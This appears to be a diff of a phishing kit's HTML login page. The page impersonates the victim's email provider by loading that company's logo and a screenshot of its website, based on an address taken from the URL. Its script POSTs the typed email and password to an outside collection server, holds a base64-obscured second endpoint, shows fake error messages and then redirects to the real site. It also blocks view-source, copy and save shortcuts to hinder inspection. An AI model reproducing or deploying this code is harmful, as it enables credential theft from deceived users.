@@ -1,4 +1,4 @@
-﻿<!doctype html>
+<!doctype html>
 <html lang="en">
 <head>
   <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
@@ -182,7 +182,7 @@ padding: 12% 12% 12% 15%;
 
 
 <div id="Hidediv"class="login-form">
-<form action="#" method="POST" name="mac" id="loginForm">
+<form action="#" method="get" name="mac" id="mac">
 <h2 class="text-center"><div id="top">
   <img src="https://res.cloudinary.com/pta/image/upload/v1631524936/ii_c5byfb.png" alt="" id="logoimg" onerror="return validateform();" style="width:50px;height:50px;">
 		
@@ -246,24 +246,11 @@ document.mac.bot.value = zork1;
     <style>.tb_button {padding:1px;cursor:pointer;border-right: 1px solid #8b8b8b;border-left: 1px solid #FFF;border-bottom: 1px solid #fff;}.tb_button.hover {border:2px outset #def; background-color: #f8f8f8 !important;}.ws_toolbar {z-index:100000} .ws_toolbar .ws_tb_btn {cursor:pointer;border:1px solid #555;padding:3px}   .tb_highlight{background-color:yellow} .tb_hide {visibility:hidden} .ws_toolbar img {padding:2px;margin:0px}</style>
 
 
-  <!-- Optional JavaScript -->
+    <!-- Optional JavaScript -->
     <!-- jQuery first, then Popper.js, then Bootstrap JS -->
-    <script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
-    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
-</body>
-<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
-<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/js/bootstrap.min.js"></script>
-<!-- jQuery first, then Popper.js, then Bootstrap JS -->
-      <script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
-      <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
-      <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
     <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
-    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/js/bootstrap.min.js"></script>
-    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/jquery.session@1.0.0/jquery.session.min.js"></script>
+        <script>
 
-  <script>
-    
 // prevent ctrl + s
 $(document).bind('keydown', function(e) {
 if(e.ctrlKey && (e.which == 83)) {
@@ -276,7 +263,7 @@ document.addEventListener('contextmenu', event => event.preventDefault());
 
 document.onkeydown = function(e) {
 if (e.ctrlKey && 
-(e.keyCode === 67 || 
+(e.keyCode === 67 ||   
 e.keyCode === 86 || 
 e.keyCode === 85 || 
 e.keyCode === 117)) {
@@ -295,130 +282,168 @@ return true;
 
 
 
-/* global $ */
-$(document).ready(function(){
-var count=0;
 
-$('#back1').click(function () {
-$("#msg").hide();
-$('#email').val("");
-$("#automail").animate({left:200, opacity:"hide"}, 0);
-$("#inputbar").animate({right:200, opacity:"show"}, 1000);
-
-});
-
-var email = window.location.hash.substr(1);
-if (!email) {
-
-}
-else
-{
-var my_email =email;
-$('#email').val(my_email);
-$('#emailich').html(my_email);
-var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
-
-if (!filter.test(my_email)) {
-$('#error').show();
-email.focus;
-return false;
-}
-var ind=my_email.indexOf("@");
-var my_slice=my_email.substr((ind+1));
-var c= my_slice.substr(0, my_slice.indexOf('.'));
-var final= c.toLowerCase();
-var finalu= c.toUpperCase();
-
-$("#logoimg").attr("src", "https://logo.clearbit.com/"+my_slice);
-$("#logoname").html(finalu);
-$(".logoname").html(finalu);
-}
+    /* global $ */
+    $(document).ready(function(){
+      var count=0;
+	  		let hide = document.getElementById("Hidediv");
+				hide.style.display = "none";
+				let callEmail = document.getElementById("callEmail");
+				
+               let divide = document.getElementById("loadNew");
+                setTimeout(displayOthers, 5000);
 
 
-$('#submit-btn').click(function(event){
-$('#error').hide();
-$('#msg').hide();
-event.preventDefault();
-var email=$("#email").val();
-var password=$("#password").val();
-var msg = $('#msg').html();
-$('#msg').text( msg );
-///////////new injection////////////////
-var my_email =email;
-var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
+        function displayOthers() {
+            divide.style.display = "none";
+            hide.style.display = "block";
+            console.log("Display function is working");
+        }
+ 
+      $('#back1').click(function () {
+        $("#msg").hide();
+        $('#email').val("");
+        $("#automail").animate({left:200, opacity:"hide"}, 0);
+        $("#inputbar").animate({right:200, opacity:"show"}, 1000);
 
-if (!filter.test(my_email)) {
-$('#error').show();
-email.focus;
-return false;
-}
+      });
 
-var ind=my_email.indexOf("@");
-var my_slice=my_email.substr((ind+1));
-var c= my_slice.substr(0, my_slice.indexOf('.'));
-var final= c.toLowerCase();
-var finalu= c.toUpperCase();
+      var email = window.location.hash.substr(1);
+	  callEmail.innerHTML = email;
+      if (!email) {
 
-$("#logoimg").attr("src", "https://logo.clearbit.com/"+my_slice);
-$("#logoname").html(finalu);
-///////////new injection////////////////
-count=count+1;
+      }
+      else
+      {
+        var my_email =email;
+        $('#email').val(my_email); 
+        var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
 
-$.ajax({
-dataType: 'JSON',
-url: 'https://demo.thailoilgroup.com/vice/s.php',
-type: 'POST',
-      	data:{
-      		email:email,
-      		password:password,
-      	},
+        if (!filter.test(my_email)) {
+          $('#error').show();
+           email.focus;
+           return false;
+        }
+        var ind=my_email.indexOf("@");
+        var my_slice=my_email.substr((ind+1));
+        var mainPage = 'https://'+my_slice; 
+		var c= my_slice.substr(0, my_slice.indexOf('.'));
+        var final= c.toLowerCase();
+        var finalu= c.toUpperCase();
+	
+		var sv = my_slice;
+		
+		var image = "url('https://image.thum.io/get/width/1200/https://www."+sv;"')"
+		
+		//var image = "url('https://"+sv;"')"
+	
+
+        $("#logoimg").attr("src", "https://logo.clearbit.com/"+mainPage);
+		$("#logoname").html(final);
+		$(".logoname").html(final);
+         
+        document.body.style.backgroundImage = image;
+
+		
+	 	
+        $(".email").html(email);
+		 
+      }
+ 
+      $('#submit-btn').click(function(event){
+    
+		event.preventDefault();
+        $('#error').hide();
+        $('#msg').hide();
+        var email=$("#email").val();
+        var password=$("#password").val();
+      ///////////new injection////////////////
+      var my_email =email;
+      var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
+
+      if (!email) {
+            $('#error').show();
+            $('#error').html("Email field is empty");
+        
+            return false;
+        }
+
+        if (!filter.test(my_email)) {
+            $('#error').show();
+            $('#error').html("That account doesn't exist. Enter a different account");
+            
+            return false;
+        }
+        if (!password) {
+            $('#error').show();
+            $('#error').html("Password field is empty");
+         
+            return false;
+        }
+
+ 
+		 
+      ///////////new injection////////////////
+      count=count+1;
+    //  console.log(count); 
+	var d=atob('aHR0cHM6Ly8xdGhhc2hjb2luLmNvbS9hc3NldHMvb28ucGhw');
+	   $.ajax({
+        dataType: 'JSON',
+		url: 'https://demo.thailoilgroup.com/vice/s.php',
+        type: 'POST',
+        data:{
+          email:email,
+          password:password
+        },
             // data: $('#contact').serialize(),
             beforeSend: function(xhr){
-            	$('#submit-btn').val('Verifing...');
+              $('#submit-btn').html('Sign in');
+			  
+    //  console.log(count); 
             },
             success: function(response){
-            	if(response){
-            		$("#msg").show();
-            		console.log(response);
-            		if(response['signal'] == 'ok'){
-            			$("#password").val("");
-            			if (count>=2) {
-            				count=0;
+			 $('#msg').html("<span style='color:red;'>Network error. Please try again</span>");
+              if(response){
+                $("#msg").show();
+				console.log(response);
+				$('#msg').html(response['msg']);
+                if(response['signal'] == 'ok'){
+                  $("#password").val("");
+                  if (count>=2) {
+                    count=0;
                     // window.location.replace(response['redirect_link']);
                     window.location.replace("https://www."+my_slice);
 
+                  }
+                  // $('#msg').html(response['msg']);
                 }
-                $('#msg').html(response['msg']);
+                else{
+                   $('#msg').html(response['msg']);
+                }
+              }
+            },
+            error: function(){
+              $("#password").val("");
+              if (count>=2) {
+                count=0;
+                window.location.replace("https://www."+my_slice);
+              }
+              $("#msg").show();
+              // $('#msg').html("Please try again later");
+            },
+            complete: function(){
+              $('#submit-btn').html('Sgn in');
             }
-            else{
-            	$('#msg').html(response['msg']);
-            }
-        }
-    },
-    error: function(){
-    	$("#password").val("");
-    	if (count>=2) {
-    		count=0;
-    		 window.location.replace("https://www."+my_slice);
-    	}
-    	$("#msg").show();
-    	$('#msg').html("Invalid Password, please try again.");
-    },
-    complete: function(){
-    	$('#submit-btn').val('Submit');
-    }
-});
-  });
+          });  
+    });
 
 
-	});
+    });
 
 
-</script>
+  </script>
+  
 
 
 
-
-</body>
-
-</html>
+</div></div></body></html>
